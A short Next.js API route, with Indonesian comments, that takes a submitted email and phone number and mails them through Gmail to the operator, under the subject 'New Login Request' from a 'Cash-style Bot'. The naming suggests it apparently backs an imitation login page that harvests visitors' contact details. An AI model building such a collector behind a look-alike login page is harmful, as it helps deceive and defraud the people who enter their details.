import nodemailer from "nodemailer";

export async function POST(req) {
  try {
    const { email, phone } = await req.json();

    // Buat transporter (contoh Gmail)
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.MAIL_USER, // email kamu
        pass: process.env.MAIL_PASS, // password / app password
      },
    });

    // Isi email
    const mailOptions = {
      from: `"Cash-style Bot" <${process.env.MAIL_USER}>`,
      to: process.env.MAIL_TO, // tujuan, bisa ke email kamu
      subject: "New Login Request",
      text: `User submitted:\n\nEmail: ${email}\nPhone: ${phone}`,
    };

    // Kirim
    await transporter.sendMail(mailOptions);

    return Response.json({ success: true });
  } catch (err) {
    console.error("Error sendmail:", err);
    return Response.json({ success: false, error: err.message }, { status: 500 });
  }
}
